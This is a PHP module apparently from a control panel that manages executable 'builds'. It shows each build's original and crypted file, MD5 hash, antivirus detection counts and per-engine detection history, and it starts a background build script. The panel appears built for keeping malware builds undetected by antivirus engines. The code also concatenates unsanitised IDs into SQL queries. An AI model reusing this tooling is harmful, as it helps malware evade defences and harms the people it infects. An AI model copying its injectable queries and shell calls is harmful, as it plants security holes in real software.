<?php

function check_pid(){
    if(file_exists('cache/builds.pid')){
        $pid = file_get_contents('cache/builds.pid');
        if(stripos(exec('ps -p '.$pid), $pid) === false){
	    return false;
        }else{
            return true;
        }
    }else{
        return false;
    }
}

function get_status($id){
    global $lang;
    
    if(isset($lang['status'][$id])){
        return $lang['status'][$id];
    }else{
        return $id;
    }
}

function to_br($str){
    return str_replace('|', '<br />', $str);
}

function to_n($str){
    return str_replace('|', "\n", $str);
}

if($Cur['str'] == 'view_av' && !empty($Cur['id'])){
    $row = $mysqli->query('SELECT * FROM bf_builds WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
    if($row->id == $Cur['id']){
        $text = '------------------------------------------------------------------------' . "\r\n";
        $text .= 'Orig File: ' . $row->file_orig . "\r\n";
        
        if(!empty($row->file_crypt)) $text .= 'Crypt File: ' . $row->file_crypt . "\r\n";
        
        $text .= 'MD5 Orig File: ' . $row->md5 . "\r\n\r\n";
        
        $text .= 'PRIO: ' . $row->prio . "\r\n\r\n";

        $text .= 'AV Count All : ' . $row->avc . "\r\n";
        
        $text .= "AV List All: " . trim(str_replace('|', ", ", $row->avcs), ", ") . "\r\n\r\n";
        
        $text .= 'AV Count Detect: ' . $row->avcf . "\r\n";
        
        $text .= "AV Detect List: \r\n\r\n   " . trim(str_replace('|', "\r\n   ", $row->avt), "\r\n");
        
        if(!empty($row->history)){
            $h = @json_decode(@base64_decode($row->history), true);
            if(is_array($h)){
                $text .= "\r\n" . '------------------------------------------------------------------------' . "\r\n";
                $text .= "\r\n\r\n\r\n" . 'Current history check:' . "\r\n\r\n";
    
                foreach($h as $key => $item){
                    $text .= 'File name: ' . $key . ".exe\r\n";
                    
                    $text .= 'PRIO: ' . $item['prio'] . "\r\n";
                    $text .= 'AV Detect: ' . $item['avcf'] . "\r\n";
                    $text .= 'AV List: ' . "\r\n   " . trim(str_replace('|', "\r\n   ", $item['av']), "\r\n");
                    $text .= "\r\n\r\n";
                }
            }
        }
        $smarty->assign('text', $text);
        $smarty->display('modules/autosys/builds_av.tpl');
    }
    exit;
}

if($Cur['str'] == 'start_builds'){
    file_put_contents('/tmp/builds.sh', '#!/bin/sh' . "\n");
    file_put_contents('/tmp/builds.sh', 'cd ' . realpath('crons/scripts/') . "/\n", FILE_APPEND);
    file_put_contents('/tmp/builds.sh', '/usr/bin/env php ' . realpath('crons/scripts/') . '/builds.php > /dev/null &', FILE_APPEND);
    chmod('/tmp/builds.sh', 0777);
    @system('/tmp/builds.sh');
    unlink('/tmp/builds.sh');
    sleep(3);
    header('Location: /autosys/builds.html');
    exit;
}

$builds = array();
for($i = 1; $i <= 3; $i++){
    $builds[$i] = $mysqli->query('SELECT * FROM bf_builds WHERE (type = \''.$i.'\') ORDER by id DESC', null, null, false);
}
$smarty->assign('builds', $builds);


$smarty->assign('check_pid', check_pid());

?>